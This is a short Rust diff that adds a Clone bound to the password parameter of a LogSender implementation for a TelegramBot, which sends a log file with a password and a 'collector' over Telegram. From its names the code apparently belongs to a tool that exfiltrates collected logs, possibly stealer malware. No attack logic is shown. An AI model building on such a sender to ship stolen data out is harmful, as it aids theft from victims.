@@ -186,7 +186,7 @@ fn combine_caption_and_thumbnail(caption: &str, thumbnail: Option<String>) -> St
 impl LogSender for TelegramBot {
     fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
     where
-        P: AsRef<str>,
+        P: AsRef<str> + Clone,
         C: Collector
     {
         let (caption, thumbnail) = generate_caption(&log_file, password, collector);
